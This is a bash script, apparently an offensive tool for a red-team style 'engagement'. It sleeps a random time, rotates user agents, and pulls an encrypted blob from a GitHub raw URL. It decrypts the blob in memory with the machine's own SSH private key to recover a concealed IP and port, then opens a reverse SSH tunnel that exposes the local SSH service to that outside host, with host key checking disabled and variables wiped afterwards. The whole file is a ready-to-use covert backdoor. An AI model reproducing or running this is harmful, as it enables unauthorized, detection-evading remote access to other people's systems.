#!/usr/bin/env bash
set -euo pipefail

### Configuration (tweak to your engagement) ###
GITHUB_RAW="https://raw.githubusercontent.com/username/repo/main/encrypted.bin"
PUBKEY_ID="tunneluser"                 # SSH user on target
SSH_OPTS="-o ServerAliveInterval=30 \
          -o ServerAliveCountMax=3 \
          -o StrictHostKeyChecking=no" # allow unknown hosts
RETRY=4                                 # how many download retries
DELAY_MIN=45                            # lower bound sleep (sec)
DELAY_MAX=180                           # upper bound sleep (sec)
USER_AGENTS=(                           # rotate these or add more
  "Mozilla/5.0 (X11; Linux x86_64)"
  "curl/7.68.0"
  "Wget/1.20.3"
  "python-requests/2.25.1"
)

# pick random delay & jitter
RND_DELAY=$(( RANDOM % (DELAY_MAX-DELAY_MIN+1) + DELAY_MIN ))
sleep $RND_DELAY

# pick random UA
UA=${USER_AGENTS[RANDOM % ${#USER_AGENTS[@]}]}

# downloader: try curl → wget → python
fetch_blob() {
  local url=$1
  if command -v curl &>/dev/null; then
    curl -sSL -H "User-Agent: $UA" "$url"
  elif command -v wget &>/dev/null; then
    wget -qO- --header="User-Agent: $UA" "$url"
  else
    # fallback: python3
    python3 -c "
import sys, urllib.request
req=urllib.request.Request('$url', headers={'User-Agent':'$UA'})
sys.stdout.buffer.write(urllib.request.urlopen(req).read())
"
  fi
}

# unobtrusive in-memory download + decrypt
for i in $(seq 1 $RETRY); do
  ENC_BLOB=$(fetch_blob "$GITHUB_RAW") && break
  sleep $((5 + RANDOM % 5))
  [ $i -lt $RETRY ] || exit 1
done

# in-memory decryption (RSA private key in agent or default ~/.ssh)
DECRYPTED=$(printf "%s" "$ENC_BLOB" \
  | openssl rsautl -decrypt -inkey ~/.ssh/id_rsa -in /dev/stdin 2>/dev/null)

# split "IP:PORT"
HOST=${DECRYPTED%%:*}
PORT=${DECRYPTED##*:}

# generate final SSH command (in-memory)
SSH_CMD=(ssh -fN $SSH_OPTS -R "$PORT:localhost:22" "$PUBKEY_ID@$HOST")

# hygiene: unset sensitive vars ASAP
unset ENC_BLOB DECRYPTED PUBKEY_ID GITHUB_RAW

# trap Ctrl+C and exit cleanly
trap 'exit 0' INT TERM

# execute tunnel
exec "${SSH_CMD[@]}"

